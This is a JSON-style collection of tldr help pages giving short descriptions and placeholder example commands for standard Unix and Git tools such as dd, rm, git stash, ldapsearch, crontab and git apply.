    "dd": "# dd\n> Convert and copy a file. More information: https://keith.github.io/xcode-\n> man-pages/dd.1.html.\n  * Make a bootable USB drive from an isohybrid file (such like `archlinux-xxx.iso`) and show the progress:\n`dd if={{path/to/file.iso}} of={{/dev/usb_device}} status=progress`\n  * Clone a drive to another drive with 4 MB block, ignore error and show the progress:\n`dd if={{/dev/source_device}} of={{/dev/dest_device}} bs={{4m}}\nconv={{noerror}} status=progress`\n  * Generate a file of 100 random bytes by using kernel random driver:\n`dd if=/dev/urandom of={{path/to/random_file}} bs={{100}} count={{1}}`\n  * Benchmark the write performance of a disk:\n`dd if=/dev/zero of={{path/to/1GB_file}} bs={{1024}} count={{1000000}}`\n  * Generate a system backup into an IMG file and show the progress:\n`dd if=/dev/{{drive_device}} of={{path/to/file.img}} status=progress`\n  * Restore a drive from an IMG file and show the progress:\n`dd if={{path/to/file.img}} of={{/dev/drive_device}} status=progress`\n  * Check the progress of an ongoing dd operation (run this command from another shell):\n`kill -USR1 $(pgrep ^dd)`",
    "git-var": "# git var\n> Prints a Git logical variable's value. See `git config`, which is preferred\n> over `git var`. More information: https://git-scm.com/docs/git-var.\n  * Print the value of a Git logical variable:\n`git var {{GIT_AUTHOR_IDENT|GIT_COMMITTER_IDENT|GIT_EDITOR|GIT_PAGER}}`\n  * [l]ist all Git logical variables:\n`git var -l`",
    "uudecode": "# uudecode\n> Decode files encoded by `uuencode`. More information:\n> https://manned.org/uudecode.\n  * Decode a file that was encoded with `uuencode` and print the result to `stdout`:\n`uudecode {{path/to/encoded_file}}`\n  * Decode a file that was encoded with `uuencode` and write the result to a file:\n`uudecode -o {{path/to/decoded_file}} {{path/to/encoded_file}}`",
    "diff": "# diff\n> Compare files and directories. More information: https://man7.org/linux/man-\n> pages/man1/diff.1.html.\n  * Compare files (lists changes to turn `old_file` into `new_file`):\n`diff {{old_file}} {{new_file}}`\n  * Compare files, ignoring white spaces:\n`diff --ignore-all-space {{old_file}} {{new_file}}`\n  * Compare files, showing the differences side by side:\n`diff --side-by-side {{old_file}} {{new_file}}`\n  * Compare files, showing the differences in unified format (as used by `git diff`):\n`diff --unified {{old_file}} {{new_file}}`\n  * Compare directories recursively (shows names for differing files/directories as well as changes made to files):\n`diff --recursive {{old_directory}} {{new_directory}}`\n  * Compare directories, only showing the names of files that differ:\n`diff --recursive --brief {{old_directory}} {{new_directory}}`\n  * Create a patch file for Git from the differences of two text files, treating nonexistent files as empty:\n`diff --text --unified --new-file {{old_file}} {{new_file}} > {{diff.patch}}`",
    "vi": "# vi\n> This command is an alias of `vim`.\n  * View documentation for the original command:\n`tldr vim`",
    "pwdx": "# pwdx\n> Print working directory of a process. More information:\n> https://manned.org/pwdx.\n  * Print current working directory of a process:\n`pwdx {{process_id}}`",
    "rm": "# rm\n> Remove files or directories. See also: `rmdir`. More information:\n> https://www.gnu.org/software/coreutils/rm.\n  * Remove specific files:\n`rm {{path/to/file1 path/to/file2 ...}}`\n  * Remove specific files ignoring nonexistent ones:\n`rm -f {{path/to/file1 path/to/file2 ...}}`\n  * Remove specific files [i]nteractively prompting before each removal:\n`rm -i {{path/to/file1 path/to/file2 ...}}`\n  * Remove specific files printing info about each removal:\n`rm -v {{path/to/file1 path/to/file2 ...}}`\n  * Remove specific files and directories [r]ecursively:\n`rm -r {{path/to/file_or_directory1 path/to/file_or_directory2 ...}}`",
    "ldapsearch": "# ldapsearch\n> Query an LDAP directory. More information: https://docs.ldap.com/ldap-\n> sdk/docs/tool-usages/ldapsearch.html.\n  * Query an LDAP server for all items that are a member of the given group and return the object's displayName value:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}} -b\n{{base_ou}} '{{memberOf=group1}}' displayName`\n  * Query an LDAP server with a no-newline password file for all items that are a member of the given group and return the object's displayName value:\n`ldapsearch -D '{{admin_DN}}' -y '{{password_file}}' -h {{ldap_host}} -b\n{{base_ou}} '{{memberOf=group1}}' displayName`\n  * Return 5 items that match the given filter:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}} -b\n{{base_ou}} '{{memberOf=group1}}' -z 5 displayName`\n  * Wait up to 7 seconds for a response:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}} -b\n{{base_ou}} '{{memberOf=group1}}' -l 7 displayName`\n  * Invert the filter:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}} -b\n{{base_ou}} '(!(memberOf={{group1}}))' displayName`\n  * Return all items that are part of multiple groups, returning the display name for each item:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}}\n'(&({{memberOf=group1}})({{memberOf=group2}})({{memberOf=group3}}))'\n\"displayName\"`\n  * Return all items that are members of at least 1 of the specified groups:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}}\n'(|({{memberOf=group1}})({{memberOf=group1}})({{memberOf=group3}}))'\ndisplayName`\n  * Combine multiple boolean logic filters:\n`ldapsearch -D '{{admin_DN}}' -w '{{password}}' -h {{ldap_host}}\n'(&({{memberOf=group1}})({{memberOf=group2}})(!({{memberOf=group3}})))'\ndisplayName`",
    "git-bugreport": "# git bugreport\n> Captures debug information from the system and user, generating a text file\n> to aid in the reporting of a bug in Git. More information: https://git-\n> scm.com/docs/git-bugreport.\n  * Create a new bug report file in the current directory:\n`git bugreport`\n  * Create a new bug report file in the specified directory, creating it if it does not exist:\n`git bugreport --output-directory {{path/to/directory}}`\n  * Create a new bug report file with the specified filename suffix in `strftime` format:\n`git bugreport --suffix {{%m%d%y}}`",
    "keyctl": "# keyctl\n> Manipulate the Linux kernel keyring. More information:\n> https://manned.org/keyctl.\n  * List keys in a specific keyring:\n`keyctl list {{target_keyring}}`\n  * List current keys in the user default session:\n`keyctl list {{@us}}`\n  * Store a key in a specific keyring:\n`keyctl add {{type_keyring}} {{key_name}} {{key_value}} {{target_keyring}}`\n  * Store a key with its value from `stdin`:\n`echo -n {{key_value}} | keyctl padd {{type_keyring}} {{key_name}}\n{{target_keyring}}`\n  * Put a timeout on a key:\n`keyctl timeout {{key_name}} {{timeout_in_seconds}}`\n  * Read a key and format it as a hex-dump if not printable:\n`keyctl read {{key_name}}`\n  * Read a key and format as-is:\n`keyctl pipe {{key_name}}`\n  * Revoke a key and prevent any further action on it:\n`keyctl revoke {{key_name}}`",
    "git-blame": "# git blame\n> Show commit hash and last author on each line of a file. More information:\n> https://git-scm.com/docs/git-blame.\n  * Print file with author name and commit hash on each line:\n`git blame {{path/to/file}}`\n  * Print file with author email and commit hash on each line:\n`git blame -e {{path/to/file}}`\n  * Print file with author name and commit hash on each line at a specific commit:\n`git blame {{commit}} {{path/to/file}}`\n  * Print file with author name and commit hash on each line before a specific commit:\n`git blame {{commit}}~ {{path/to/file}}`",
    "login": "# login\n> Initiates a session for a user. More information: https://manned.org/login.\n  * Log in as a user:\n`login {{user}}`\n  * Log in as user without authentication if user is preauthenticated:\n`login -f {{user}}`\n  * Log in as user and preserve environment:\n`login -p {{user}}`\n  * Log in as a user on a remote host:\n`login -h {{host}} {{user}}`",
    "git-show-index": "# git show-index\n> Show the packed archive index of a Git repository. More information:\n> https://git-scm.com/docs/git-show-index.\n  * Read an IDX file for a Git packfile and dump its contents to `stdout`:\n`git show-index {{path/to/file.idx}}`\n  * Specify the hash algorithm for the index file (experimental):\n`git show-index --object-format={{sha1|sha256}} {{path/to/file}}`",
    "crontab": "# crontab\n> Schedule cron jobs to run on a time interval for the current user. More\n> information: https://crontab.guru/.\n  * Edit the crontab file for the current user:\n`crontab -e`\n  * Edit the crontab file for a specific user:\n`sudo crontab -e -u {{user}}`\n  * Replace the current crontab with the contents of the given file:\n`crontab {{path/to/file}}`\n  * View a list of existing cron jobs for current user:\n`crontab -l`\n  * Remove all cron jobs for the current user:\n`crontab -r`\n  * Sample job which runs at 10:00 every day (* means any value):\n`0 10 * * * {{command_to_execute}}`\n  * Sample crontab entry, which runs a command every 10 minutes:\n`*/10 * * * * {{command_to_execute}}`\n  * Sample crontab entry, which runs a certain script at 02:30 every Friday:\n`30 2 * * Fri {{/absolute/path/to/script.sh}}`",
    "colrm": "# colrm\n> Remove columns from `stdin`. More information: https://manned.org/colrm.\n  * Remove first column of `stdin`:\n`colrm {{1 1}}`\n  * Remove from 3rd column till the end of each line:\n`colrm {{3}}`\n  * Remove from the 3rd column till the 5th column of each line:\n`colrm {{3 5}}`",
    "git-stash": "# git stash\n> Stash local Git changes in a temporary area. More information: https://git-\n> scm.com/docs/git-stash.\n  * Stash current changes, except new (untracked) files:\n`git stash push -m {{optional_stash_message}}`\n  * Stash current changes, including new (untracked) files:\n`git stash -u`\n  * Interactively select parts of changed files for stashing:\n`git stash -p`\n  * List all stashes (shows stash name, related branch and message):\n`git stash list`\n  * Show the changes as a patch between the stash (default is stash@{0}) and the commit back when stash entry was first created:\n`git stash show -p {{stash@{0}}}`\n  * Apply a stash (default is the latest, named stash@{0}):\n`git stash apply {{optional_stash_name_or_commit}}`\n  * Drop or apply a stash (default is stash@{0}) and remove it from the stash list if applying doesn't cause conflicts:\n`git stash pop {{optional_stash_name}}`\n  * Drop all stashes:\n`git stash clear`",
    "git-bisect": "# git bisect\n> Use binary search to find the commit that introduced a bug. Git\n> automatically jumps back and forth in the commit graph to progressively\n> narrow down the faulty commit. More information: https://git-\n> scm.com/docs/git-bisect.\n  * Start a bisect session on a commit range bounded by a known buggy commit, and a known clean (typically older) one:\n`git bisect start {{bad_commit}} {{good_commit}}`\n  * For each commit that `git bisect` selects, mark it as \"bad\" or \"good\" after testing it for the issue:\n`git bisect {{good|bad}}`\n  * After `git bisect` pinpoints the faulty commit, end the bisect session and return to the previous branch:\n`git bisect reset`\n  * Skip a commit during a bisect (e.g. one that fails the tests due to a different issue):\n`git bisect skip`\n  * Display a log of what has been done so far:\n`git bisect log`",
    "getopt": "# getopt\n> Parse command-line arguments. More information:\n> https://www.gnu.org/software/libc/manual/html_node/Getopt.html.\n  * Parse optional `verbose`/`version` flags with shorthands:\n`getopt --options vV --longoptions verbose,version -- --version --verbose`\n  * Add a `--file` option with a required argument with shorthand `-f`:\n`getopt --options f: --longoptions file: -- --file=somefile`\n  * Add a `--verbose` option with an optional argument with shorthand `-v`, and pass a non-option parameter `arg`:\n`getopt --options v:: --longoptions verbose:: -- --verbose arg`\n  * Accept a `-r` and `--verbose` flag, a `--accept` option with an optional argument and add a `--target` with a required argument option with shorthands:\n`getopt --options rv::s::t: --longoptions verbose,source::,target: -- -v\n--target target`",
    "pkill": "# pkill\n> Signal process by name. Mostly used for stopping processes. More\n> information: https://www.man7.org/linux/man-pages/man1/pkill.1.html.\n  * Kill all processes which match:\n`pkill \"{{process_name}}\"`\n  * Kill all processes which match their full command instead of just the process name:\n`pkill -f \"{{command_name}}\"`\n  * Force kill matching processes (can't be blocked):\n`pkill -9 \"{{process_name}}\"`\n  * Send SIGUSR1 signal to processes which match:\n`pkill -USR1 \"{{process_name}}\"`\n  * Kill the main `firefox` process to close the browser:\n`pkill --oldest \"{{firefox}}\"`",
    "ssh-keyscan": "# ssh-keyscan\n> Get the public ssh keys of remote hosts. More information:\n> https://man.openbsd.org/ssh-keyscan.\n  * Retrieve all public ssh keys of a remote host:\n`ssh-keyscan {{host}}`\n  * Retrieve all public ssh keys of a remote host listening on a specific port:\n`ssh-keyscan -p {{port}} {{host}}`\n  * Retrieve certain types of public ssh keys of a remote host:\n`ssh-keyscan -t {{rsa,dsa,ecdsa,ed25519}} {{host}}`\n  * Manually update the ssh known_hosts file with the fingerprint of a given host:\n`ssh-keyscan -H {{host}} >> ~/.ssh/known_hosts`",
    "systemd-notify": "# systemd-notify\n> Notify the service manager about start-up completion and other daemon status\n> changes. This command is useless outside systemd service scripts. More\n> information: https://www.freedesktop.org/software/systemd/man/systemd-\n> notify.html.\n  * Notify systemd that the service has completed its initialization and is fully started. It should be invoked when the service is ready to accept incoming requests:\n`systemd-notify --booted`\n  * Signal to systemd that the service is ready to handle incoming connections or perform its tasks:\n`systemd-notify --ready`\n  * Provide a custom status message to systemd (this information is shown by `systemctl status`):\n`systemd-notify --status=\"{{Add custom status message here...}}\"`",
    "git-symbolic-ref": "# git symbolic-ref\n> Read, change, or delete files that store references. More information:\n> https://git-scm.com/docs/git-symbolic-ref.\n  * Store a reference by a name:\n`git symbolic-ref refs/{{name}} {{ref}}`\n  * Store a reference by name, including a message with a reason for the update:\n`git symbolic-ref -m \"{{message}}\" refs/{{name}} refs/heads/{{branch_name}}`\n  * Read a reference by name:\n`git symbolic-ref refs/{{name}}`\n  * Delete a reference by name:\n`git symbolic-ref --delete refs/{{name}}`\n  * For scripting, hide errors with `--quiet` and use `--short` to simplify (\"refs/heads/X\" prints as \"X\"):\n`git symbolic-ref --quiet --short refs/{{name}}`",
    "git-instaweb": "# git instaweb\n> Helper to launch a GitWeb server. More information: https://git-\n> scm.com/docs/git-instaweb.\n  * Launch a GitWeb server for the current Git repository:\n`git instaweb --start`\n  * Listen only on localhost:\n`git instaweb --start --local`\n  * Listen on a specific port:\n`git instaweb --start --port {{1234}}`\n  * Use a specified HTTP daemon:\n`git instaweb --start --httpd {{lighttpd|apache2|mongoose|plackup|webrick}}`\n  * Also auto-launch a web browser:\n`git instaweb --start --browser`\n  * Stop the currently running GitWeb server:\n`git instaweb --stop`\n  * Restart the currently running GitWeb server:\n`git instaweb --restart`",
    "utmpdump": "# utmpdump\n> Dump and load btmp, utmp and wtmp accounting files. More information:\n> https://manned.org/utmpdump.\n  * Dump the `/var/log/wtmp` file to `stdout` as plain text:\n`utmpdump {{/var/log/wtmp}}`\n  * Load a previously dumped file into `/var/log/wtmp`:\n`utmpdump -r {{dumpfile}} > {{/var/log/wtmp}}`",
    "git-verify-tag": "# git verify-tag\n> Check for GPG verification of tags. If a tag wasn't signed, an error will\n> occur. More information: https://git-scm.com/docs/git-verify-tag.\n  * Check tags for a GPG signature:\n`git verify-tag {{tag1 optional_tag2 ...}}`\n  * Check tags for a GPG signature and show details for each tag:\n`git verify-tag {{tag1 optional_tag2 ...}} --verbose`\n  * Check tags for a GPG signature and print the raw details:\n`git verify-tag {{tag1 optional_tag2 ...}} --raw`",
    "du": "# du\n> Disk usage: estimate and summarize file and directory space usage. More\n> information: https://ss64.com/osx/du.html.\n  * List the sizes of a directory and any subdirectories, in the given unit (KiB/MiB/GiB):\n`du -{{k|m|g}} {{path/to/directory}}`\n  * List the sizes of a directory and any subdirectories, in human-readable form (i.e. auto-selecting the appropriate unit for each size):\n`du -h {{path/to/directory}}`\n  * Show the size of a single directory, in human-readable units:\n`du -sh {{path/to/directory}}`\n  * List the human-readable sizes of a directory and of all the files and directories within it:\n`du -ah {{path/to/directory}}`\n  * List the human-readable sizes of a directory and any subdirectories, up to N levels deep:\n`du -h -d {{2}} {{path/to/directory}}`\n  * List the human-readable size of all `.jpg` files in subdirectories of the current directory, and show a cumulative total at the end:\n`du -ch {{*/*.jpg}}`",
    "pgrep": "# pgrep\n> Find or signal processes by name. More information:\n> https://www.man7.org/linux/man-pages/man1/pkill.1.html.\n  * Return PIDs of any running processes with a matching command string:\n`pgrep {{process_name}}`\n  * Search for processes including their command-line options:\n`pgrep --full \"{{process_name}} {{parameter}}\"`\n  * Search for processes run by a specific user:\n`pgrep --euid root {{process_name}}`",
    "git-credential-cache": "# git credential-cache\n> Git helper to temporarily store passwords in memory. More information:\n> https://git-scm.com/docs/git-credential-cache.\n  * Store Git credentials for a specific amount of time:\n`git config credential.helper 'cache --timeout={{time_in_seconds}}'`",
    "git-log": "# git log\n> Show a history of commits. More information: https://git-scm.com/docs/git-\n> log.\n  * Show the sequence of commits starting from the current one, in reverse chronological order of the Git repository in the current working directory:\n`git log`\n  * Show the history of a particular file or directory, including differences:\n`git log -p {{path/to/file_or_directory}}`\n  * Show an overview of which file(s) changed in each commit:\n`git log --stat`\n  * Show a graph of commits in the current branch using only the first line of each commit message:\n`git log --oneline --graph`\n  * Show a graph of all commits, tags and branches in the entire repo:\n`git log --oneline --decorate --all --graph`\n  * Show only commits whose messages include a given string (case-insensitively):\n`git log -i --grep {{search_string}}`\n  * Show the last N commits from a certain author:\n`git log -n {{number}} --author={{author}}`\n  * Show commits between two dates (yyyy-mm-dd):\n`git log --before=\"{{2017-01-29}}\" --after=\"{{2017-01-17}}\"`",
    "quota": "# quota\n> Display users' disk space usage and allocated limits. More information:\n> https://manned.org/quota.\n  * Show disk quotas in human-readable units for the current user:\n`quota -s`\n  * Verbose output (also display quotas on filesystems where no storage is allocated):\n`quota -v`\n  * Quiet output (only display quotas on filesystems where usage is over quota):\n`quota -q`\n  * Print quotas for the groups of which the current user is a member:\n`quota -g`\n  * Show disk quotas for another user:\n`sudo quota -u {{username}}`",
    "git-format-patch": "# git format-patch\n> Prepare .patch files. Useful when emailing commits elsewhere. See also `git\n> am`, which can apply generated .patch files. More information: https://git-\n> scm.com/docs/git-format-patch.\n  * Create an auto-named `.patch` file for all the unpushed commits:\n`git format-patch {{origin}}`\n  * Write a `.patch` file for all the commits between 2 revisions to `stdout`:\n`git format-patch {{revision_1}}..{{revision_2}}`\n  * Write a `.patch` file for the 3 latest commits:\n`git format-patch -{{3}}`",
    "sync": "# sync\n> Flushes all pending write operations to the appropriate disks. More\n> information: https://www.gnu.org/software/coreutils/sync.\n  * Flush all pending write operations on all disks:\n`sync`\n  * Flush all pending write operations on a single file to disk:\n`sync {{path/to/file}}`",
    "rmdir": "# rmdir\n> Remove directories without files. See also: `rm`. More information:\n> https://www.gnu.org/software/coreutils/rmdir.\n  * Remove specific directories:\n`rmdir {{path/to/directory1 path/to/directory2 ...}}`\n  * Remove specific nested directories recursively:\n`rmdir -p {{path/to/directory1 path/to/directory2 ...}}`",
    "shuf": "# shuf\n> Generate random permutations. More information: https://www.unix.com/man-\n> page/linux/1/shuf/.\n  * Randomize the order of lines in a file and output the result:\n`shuf {{filename}}`\n  * Only output the first 5 entries of the result:\n`shuf --head-count={{5}} {{filename}}`\n  * Write output to another file:\n`shuf {{filename}} --output={{output_filename}}`\n  * Generate random numbers in range 1-10:\n`shuf --input-range={{1-10}}`",
    "git-bundle": "# git bundle\n> Package objects and references into an archive. More information:\n> https://git-scm.com/docs/git-bundle.\n  * Create a bundle file that contains all objects and references of a specific branch:\n`git bundle create {{path/to/file.bundle}} {{branch_name}}`\n  * Create a bundle file of all branches:\n`git bundle create {{path/to/file.bundle}} --all`\n  * Create a bundle file of the last 5 commits of the current branch:\n`git bundle create {{path/to/file.bundle}} -{{5}} {{HEAD}}`\n  * Create a bundle file of the latest 7 days:\n`git bundle create {{path/to/file.bundle}} --since={{7.days}} {{HEAD}}`\n  * Verify that a bundle file is valid and can be applied to the current repository:\n`git bundle verify {{path/to/file.bundle}}`\n  * Print to `stdout` the list of references contained in a bundle:\n`git bundle unbundle {{path/to/file.bundle}}`\n  * Unbundle a specific branch from a bundle file into the current repository:\n`git pull {{path/to/file.bundle}} {{branch_name}}`",
    "namei": "# namei\n> Follows a pathname (which can be a symbolic link) until a terminal point is\n> found (a file/directory/char device etc). This program is useful for finding\n> \"too many levels of symbolic links\" problems. More information:\n> https://manned.org/namei.\n  * Resolve the pathnames specified as the argument parameters:\n`namei {{path/to/a}} {{path/to/b}} {{path/to/c}}`\n  * Display the results in a long-listing format:\n`namei --long {{path/to/a}} {{path/to/b}} {{path/to/c}}`\n  * Show the mode bits of each file type in the style of `ls`:\n`namei --modes {{path/to/a}} {{path/to/b}} {{path/to/c}}`\n  * Show owner and group name of each file:\n`namei --owners {{path/to/a}} {{path/to/b}} {{path/to/c}}`\n  * Don't follow symlinks while resolving:\n`namei --nosymlinks {{path/to/a}} {{path/to/b}} {{path/to/c}}`",
    "egrep": "# egrep\n> Find patterns in files using extended regular expression (supports `?`, `+`,\n> `{}`, `()` and `|`). More information: https://manned.org/egrep.\n  * Search for a pattern within a file:\n`egrep \"{{search_pattern}}\" {{path/to/file}}`\n  * Search for a pattern within multiple files:\n`egrep \"{{search_pattern}}\" {{path/to/file1}} {{path/to/file2}}\n{{path/to/file3}}`\n  * Search `stdin` for a pattern:\n`cat {{path/to/file}} | egrep {{search_pattern}}`\n  * Print file name and line number for each match:\n`egrep --with-filename --line-number \"{{search_pattern}}\" {{path/to/file}}`\n  * Search for a pattern in all files recursively in a directory, ignoring binary files:\n`egrep --recursive --binary-files={{without-match}} \"{{search_pattern}}\"\n{{path/to/directory}}`\n  * Search for lines that do not match a pattern:\n`egrep --invert-match \"{{search_pattern}}\" {{path/to/file}}`",
    "setfacl": "# setfacl\n> Set file access control lists (ACL). More information:\n> https://manned.org/setfacl.\n  * Modify ACL of a file for user with read and write access:\n`setfacl -m u:{{username}}:rw {{file}}`\n  * Modify default ACL of a file for all users:\n`setfacl -d -m u::rw {{file}}`\n  * Remove ACL of a file for a user:\n`setfacl -x u:{{username}} {{file}}`\n  * Remove all ACL entries of a file:\n`setfacl -b {{file}}`",
    "busctl": "# busctl\n> Introspect and monitor the D-Bus bus. More information:\n> https://www.freedesktop.org/software/systemd/man/busctl.html.\n  * Show all peers on the bus, by their service names:\n`busctl list`\n  * Show process information and credentials of a bus service, a process, or the owner of the bus (if no parameter is specified):\n`busctl status {{service|pid}}`\n  * Dump messages being exchanged. If no service is specified, show all messages on the bus:\n`busctl monitor {{service1 service2 ...}}`\n  * Show an object tree of one or more services (or all services if no service is specified):\n`busctl tree {{service1 service2 ...}}`\n  * Show interfaces, methods, properties and signals of the specified object on the specified service:\n`busctl introspect {{service}} {{path/to/object}}`\n  * Retrieve the current value of one or more object properties:\n`busctl get-property {{service}} {{path/to/object}} {{interface_name}}\n{{property_name}}`\n  * Invoke a method and show the response:\n`busctl call {{service}} {{path/to/object}} {{interface_name}}\n{{method_name}}`",
    "sh": "# sh\n> Bourne shell, the standard command language interpreter. See also\n> `histexpand` for history expansion. More information: https://manned.org/sh.\n  * Start an interactive shell session:\n`sh`\n  * Execute a command and then exit:\n`sh -c \"{{command}}\"`\n  * Execute a script:\n`sh {{path/to/script.sh}}`\n  * Read and execute commands from `stdin`:\n`sh -s`",
    "nm": "# nm\n> List symbol names in object files. More information: https://manned.org/nm.\n  * List global (extern) functions in a file (prefixed with T):\n`nm -g {{path/to/file.o}}`\n  * List only undefined symbols in a file:\n`nm -u {{path/to/file.o}}`\n  * List all symbols, even debugging symbols:\n`nm -a {{path/to/file.o}}`\n  * Demangle C++ symbols (make them readable):\n`nm --demangle {{path/to/file.o}}`",
    "logger": "# logger\n> Add messages to syslog (/var/log/syslog). More information:\n> https://manned.org/logger.\n  * Log a message to syslog:\n`logger {{message}}`\n  * Take input from `stdin` and log to syslog:\n`echo {{log_entry}} | logger`\n  * Send the output to a remote syslog server running at a given port. Default port is 514:\n`echo {{log_entry}} | logger --server {{hostname}} --port {{port}}`\n  * Use a specific tag for every line logged. Default is the name of logged in user:\n`echo {{log_entry}} | logger --tag {{tag}}`\n  * Log messages with a given priority. Default is `user.notice`. See `man logger` for all priority options:\n`echo {{log_entry}} | logger --priority {{user.warning}}`",
    "mkfifo": "# mkfifo\n> Makes FIFOs (named pipes). More information:\n> https://www.gnu.org/software/coreutils/mkfifo.\n  * Create a named pipe at a given path:\n`mkfifo {{path/to/pipe}}`",
    "git-credential-store": "# git credential-store\n> `git` helper to store passwords on disk. More information: https://git-\n> scm.com/docs/git-credential-store.\n  * Store Git credentials in a specific file:\n`git config credential.helper 'store --file={{path/to/file}}'`",
    "kill": "# kill\n> Sends a signal to a process, usually related to stopping the process. All\n> signals except for SIGKILL and SIGSTOP can be intercepted by the process to\n> perform a clean exit. More information: https://manned.org/kill.\n  * Terminate a program using the default SIGTERM (terminate) signal:\n`kill {{process_id}}`\n  * List available signal names (to be used without the `SIG` prefix):\n`kill -l`\n  * Terminate a background job:\n`kill %{{job_id}}`\n  * Terminate a program using the SIGHUP (hang up) signal. Many daemons will reload instead of terminating:\n`kill -{{1|HUP}} {{process_id}}`\n  * Terminate a program using the SIGINT (interrupt) signal. This is typically initiated by the user pressing `Ctrl + C`:\n`kill -{{2|INT}} {{process_id}}`\n  * Signal the operating system to immediately terminate a program (which gets no chance to capture the signal):\n`kill -{{9|KILL}} {{process_id}}`\n  * Signal the operating system to pause a program until a SIGCONT (\"continue\") signal is received:\n`kill -{{17|STOP}} {{process_id}}`\n  * Send a `SIGUSR1` signal to all processes with the given GID (group id):\n`kill -{{SIGUSR1}} -{{group_id}}`",
    "exec": "# exec\n> Replace the current process with another process. More information:\n> https://linuxcommand.org/lc3_man_pages/exech.html.\n  * Replace with the specified command using the current environment variables:\n`exec {{command -with -flags}}`\n  * Replace with the specified command, clearing environment variables:\n`exec -c {{command -with -flags}}`\n  * Replace with the specified command and login using the default shell:\n`exec -l {{command -with -flags}}`\n  * Replace with the specified command and change the process name:\n`exec -a {{process_name}} {{command -with -flags}}`",
    "sha224sum": "# sha224sum\n> Calculate SHA224 cryptographic checksums. More information:\n> https://www.gnu.org/software/coreutils/manual/html_node/sha2-utilities.html.\n  * Calculate the SHA224 checksum for one or more files:\n`sha224sum {{path/to/file1 path/to/file2 ...}}`\n  * Calculate and save the list of SHA224 checksums to a file:\n`sha224sum {{path/to/file1 path/to/file2 ...}} > {{path/to/file.sha224}}`\n  * Calculate a SHA224 checksum from `stdin`:\n`{{command}} | sha224sum`\n  * Read a file of SHA224 sums and filenames and verify all files have matching checksums:\n`sha224sum --check {{path/to/file.sha224}}`\n  * Only show a message for missing files or when verification fails:\n`sha224sum --check --quiet {{path/to/file.sha224}}`\n  * Only show a message when verification fails, ignoring missing files:\n`sha224sum --ignore-missing --check --quiet {{path/to/file.sha224}}`",
    "tr": "# tr\n> Translate characters: run replacements based on single characters and\n> character sets. More information: https://www.gnu.org/software/coreutils/tr.\n  * Replace all occurrences of a character in a file, and print the result:\n`tr {{find_character}} {{replace_character}} < {{path/to/file}}`\n  * Replace all occurrences of a character from another command's output:\n`echo {{text}} | tr {{find_character}} {{replace_character}}`\n  * Map each character of the first set to the corresponding character of the second set:\n`tr '{{abcd}}' '{{jkmn}}' < {{path/to/file}}`\n  * Delete all occurrences of the specified set of characters from the input:\n`tr -d '{{input_characters}}' < {{path/to/file}}`\n  * Compress a series of identical characters to a single character:\n`tr -s '{{input_characters}}' < {{path/to/file}}`\n  * Translate the contents of a file to upper-case:\n`tr \"[:lower:]\" \"[:upper:]\" < {{path/to/file}}`\n  * Strip out non-printable characters from a file:\n`tr -cd \"[:print:]\" < {{path/to/file}}`",
    "chattr": "# chattr\n> Change attributes of files or directories. More information:\n> https://manned.org/chattr.\n  * Make a file or directory immutable to changes and deletion, even by superuser:\n`chattr +i {{path/to/file_or_directory}}`\n  * Make a file or directory mutable:\n`chattr -i {{path/to/file_or_directory}}`\n  * Recursively make an entire directory and contents immutable:\n`chattr -R +i {{path/to/directory}}`",
    "git-reset": "# git reset\n> Undo commits or unstage changes, by resetting the current Git HEAD to the\n> specified state. If a path is passed, it works as \"unstage\"; if a commit\n> hash or branch is passed, it works as \"uncommit\". More information:\n> https://git-scm.com/docs/git-reset.\n  * Unstage everything:\n`git reset`\n  * Unstage specific file(s):\n`git reset {{path/to/file1 path/to/file2 ...}}`\n  * Interactively unstage portions of a file:\n`git reset --patch {{path/to/file}}`\n  * Undo the last commit, keeping its changes (and any further uncommitted changes) in the filesystem:\n`git reset HEAD~`\n  * Undo the last two commits, adding their changes to the index, i.e. staged for commit:\n`git reset --soft HEAD~2`\n  * Discard any uncommitted changes, staged or not (for only unstaged changes, use `git checkout`):\n`git reset --hard`\n  * Reset the repository to a given commit, discarding committed, staged and uncommitted changes since then:\n`git reset --hard {{commit}}`",
    "git-clone": "# git clone\n> Clone an existing repository. More information: https://git-\n> scm.com/docs/git-clone.\n  * Clone an existing repository into a new directory (the default directory is the repository name):\n`git clone {{remote_repository_location}} {{path/to/directory}}`\n  * Clone an existing repository and its submodules:\n`git clone --recursive {{remote_repository_location}}`\n  * Clone only the `.git` directory of an existing repository:\n`git clone --no-checkout {{remote_repository_location}}`\n  * Clone a local repository:\n`git clone --local {{path/to/local/repository}}`\n  * Clone quietly:\n`git clone --quiet {{remote_repository_location}}`\n  * Clone an existing repository only fetching the 10 most recent commits on the default branch (useful to save time):\n`git clone --depth {{10}} {{remote_repository_location}}`\n  * Clone an existing repository only fetching a specific branch:\n`git clone --branch {{name}} --single-branch {{remote_repository_location}}`\n  * Clone an existing repository using a specific SSH command:\n`git clone --config core.sshCommand=\"{{ssh -i path/to/private_ssh_key}}\"\n{{remote_repository_location}}`",
    "git-apply": "# git apply\n> Apply a patch to files and/or to the index without creating a commit. See\n> also `git am`, which applies a patch and also creates a commit. More\n> information: https://git-scm.com/docs/git-apply.\n  * Print messages about the patched files:\n`git apply --verbose {{path/to/file}}`\n  * Apply and add the patched files to the index:\n`git apply --index {{path/to/file}}`\n  * Apply a remote patch file:\n`curl -L {{https://example.com/file.patch}} | git apply`\n  * Output diffstat for the input and apply the patch:\n`git apply --stat --apply {{path/to/file}}`\n  * Apply the patch in reverse:\n`git apply --reverse {{path/to/file}}`\n  * Store the patch result in the index without modifying the working tree:\n`git apply --cache {{path/to/file}}`",
    "hexdump": "# hexdump\n> An ASCII, decimal, hexadecimal, octal dump. More information:\n> https://manned.org/hexdump.\n  * Print the hexadecimal representation of a file, replacing duplicate lines by '*':\n`hexdump {{path/to/file}}`\n  * Display the input offset in hexadecimal and its ASCII representation in two columns:\n`hexdump -C {{path/to/file}}`\n  * Display the hexadecimal representation of a file, but interpret only n bytes of the input:\n`hexdump -C -n{{number_of_bytes}} {{path/to/file}}`\n  * Don't replace duplicate lines with '*':\n`hexdump --no-squeezing {{path/to/file}}`",
